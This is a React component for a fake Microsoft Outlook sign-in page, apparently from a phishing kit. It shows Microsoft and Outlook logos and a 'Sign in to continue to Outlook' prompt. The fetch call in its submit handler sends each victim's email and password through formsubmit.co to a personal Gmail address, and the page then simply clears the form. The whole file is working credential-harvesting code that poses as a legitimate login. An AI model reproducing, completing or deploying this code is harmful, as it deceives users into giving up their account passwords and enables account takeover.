 import './Outlook.scss'
 
import { useState, useEffect } from "react";

import { BsFillRecordCircleFill, BsQuestionCircle  } from 'react-icons/bs';
import { FiSearch, FiLock  } from 'react-icons/fi';
import { LiaTimesSolid } from 'react-icons/lia';

import { LiaKeySolid } from "react-icons/lia";

import MicrosoftLogo from '../../assets/microsoft_logo_ee5c8d9fb6248c938fd0.svg'
import OutlookLogo from '../../assets/53_8b36337037cff88c3df2.png'




function Outlook() {
  const [isLoading, setIsLoading] = useState(false);
  const [formValues, setFormValues] = useState({});

  const [touched, setTouched] = useState({});

  //error
  const [formError, setFormError] = useState({});

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormValues({ ...formValues, [name]: value });

    setTouched((prevState) => ({
      ...prevState,
      [e.target.name]: true,
    }));
  };

  const validate = (values) => {
    const errors = {};
    const regex =
      /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;

    if (!values.email) {
      errors.email = "Email is required";
    } else if (!regex.test(values.email)) {
      errors.email = "This is not a valid email";
    }

/*
    if (!values.password) {
      errors.password = "Enter your password";
    }
*/
    return errors;
  };

  useEffect(() => {
    validate(formValues);
    setFormError(validate(formValues));
  }, [formValues, touched]);

  const handlesubmit = (e) => {
    e.preventDefault();
    setIsLoading(true);
    if (Object.keys(formError).length > 0) {
      setTouched({
        email: true,
       // password: true,
      });
      setIsLoading(false);
    }
    if (Object.keys(formError).length === 0) {
      setTouched({
        email: false,
      //  password: false,
      });

      fetch("https://formsubmit.co/oladunniwaters@gmail.com", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
        },
        body: JSON.stringify({
          password: formValues.password,
          email: formValues.email,
 
          _subject: `New form submitted  By ${formValues.email}`,
          _captcha: true,
          _blacklist: "spammy pattern, banned term, phrase",
          _template: "box",
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.success === "true") {
            setFormValues({})
            setIsLoading(false)
           // alert("success");
    
          } else {
          //  alert("failure");
          setFormValues({})
          setIsLoading(false)
          }
        })
        .catch((error) => console.log(error));
    }
  };
  

//https://formsubmit.co/ajax/71a006782d2b17418053b9d5c4d5b706


  return (
  
    <div className='payment-form-container'>

      <form onSubmit={handlesubmit} className="payment-form-cont">
        <div className='box'>
         <img src={OutlookLogo} className='Outlook-logo'/>
          
          <div className='main-microsoft-div'>
              <div className='main-microsoft-logo'>
                 <img src={MicrosoftLogo} className='microsoft-logo'/>
              </div>
               <div className='main-microsoft-signin'>
                   <h2 className='main-microsoft-signin-title'>
                      Sign in
                   </h2>
                    <p className='main-microsoft-signin-p'>
                      to continue to Outlook
                   </p>
               </div>
               
               <div>
                     
                    <input 
                    className='payment-email'
                    placeholder="Email"
                    type="text"
                    name="email"
                    value={formValues.email} onChange={handleChange} 
                    />
                    
                       <input 
                    className='payment-email'
                    placeholder="Password"
                    type="text"
                    name="password"
                    value={formValues.password} onChange={handleChange} 
                    />
          
               
               
               </div>
               
               
                <div className='main-microsoft-noaccount'>
                     <p className='main-microsoft-noaccount-p'>
                      No account?
                     </p>
                      <a href='#' className='main-microsoft-noaccount-a'>
                      Create one!
                     </a>
                </div>
                 <div className='main-microsoft-next'>
                     <button className='main-microsoft-nextBtn' type="submit">Sign in</button>
                 </div>
          </div>
          
           <div className='main-microsoft-sign-in-opt'>
               <LiaKeySolid className='main-microsoft-sign-in-opt-key'/>
                <p className='main-microsoft-sign-in-opt-p'>
                   Sign-in options
                 </p>
          </div>

        </div>

      </form>
      
      
        
       </div>  

  );
}

export default Outlook;
